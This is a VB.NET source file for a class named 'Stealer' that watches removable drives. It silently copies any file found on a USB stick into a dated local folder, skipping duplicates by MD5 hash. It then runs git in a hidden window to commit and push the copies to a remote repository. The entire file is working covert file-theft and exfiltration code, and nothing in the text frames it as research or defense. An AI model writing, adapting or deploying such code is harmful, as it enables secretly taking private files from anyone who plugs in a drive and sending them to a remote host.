Imports System.IO

Public Class Stealer
    Public Shared stolen As New List(Of String)
    Public Shared rootpath = "D:\课件\新建文件夹"
    Public Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Int32
    Public Const DRIVE_UNKNOWN = 0
    Public Const DRIVE_NO_ROOT_DIR = 1
    Public Const DRIVE_REMOVABLE = 2
    Public Const DRIVE_FIXED = 3
    Public Const DRIVE_REMOTE = 4
    Public Const DRIVE_CDROM = 5
    Public Const DRIVE_RAMDISK = 6
    Public Shared Sub steal(FilePath As String)
        Try
            Dim f As Boolean = True
            Dim tmp As New IO.FileInfo(FilePath)

            If GetDriveType(System.IO.Path.GetPathRoot(FilePath)) <> DRIVE_REMOVABLE Then
                f = False
            End If
            If f Then
                Dim t As String = getMD5(FilePath)
                If stolen.Contains(t) Then
                    Return
                Else
                    stolen.Add(t)
                End If
                Dim new_name As String = tmp.Name.Replace(tmp.Extension, "") + Format(Now(), "_yyyy_MM_dd_HH_mm_ss_ff") + tmp.Extension
                IO.Directory.CreateDirectory(rootpath & "\" + Format(Now(), "yyyy_MM_dd"))
                IO.File.Copy(FilePath, rootpath & "\" + Format(Now(), "yyyy_MM_dd") + "\" + new_name)

                Dim git As New CommandRunner("C:\Program Files\Git\cmd\git.exe", rootpath)
                logcat.Log.Logger.Instance.WriteLog(git.Run("add ."))
                logcat.Log.Logger.Instance.WriteLog(git.Run("commit -m """ & Format(Now(), "yyyy_MM_dd_HH_mm_ss_ff") & """"))
                logcat.Log.Logger.Instance.WriteLog(git.Run("push -u origin master"))
            End If
        Catch ex As Exception
            logcat.Log.Logger.Instance.WriteException(ex)
        End Try
    End Sub

    Public Shared Function getMD5(filename As String) As String
        Dim fs = New FileStream(filename, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)
        Dim md5 As System.Security.Cryptography.MD5 = New System.Security.Cryptography.MD5CryptoServiceProvider()
        Dim output As Byte() = md5.ComputeHash(fs)
        Return BitConverter.ToString(output).Replace("-", "")
    End Function

    Public Class CommandRunner
        Public Shared Property ExecutablePath As String
        Public Shared Property WorkingDirectory As String

        Public Sub New(ByVal executablePath1 As String, ByVal Optional workingDirectory1 As String = Nothing)
            ExecutablePath = If(executablePath1, CSharpImpl.__Throw(Of System.String)(New ArgumentNullException(NameOf(executablePath1))))
            WorkingDirectory = If(workingDirectory1, IO.Path.GetDirectoryName(executablePath1))
        End Sub

        Public Function Run(ByVal arguments As String) As String
            Dim info = New ProcessStartInfo() With {
                .FileName = ExecutablePath,
                .Arguments = arguments,
                .CreateNoWindow = True,
                .RedirectStandardOutput = True,
                .UseShellExecute = False,
                .WorkingDirectory = WorkingDirectory
            }
            Dim process = New Process With {
                .StartInfo = info
            }
            process.Start()
            Return process.StandardOutput.ReadToEnd()
        End Function

        Private Class CSharpImpl
            <Obsolete("Please refactor calling code to use normal throw statements")>
            Shared Function __Throw(Of T)(ByVal e As Exception) As T
                Throw e
            End Function
        End Class
    End Class
End Class
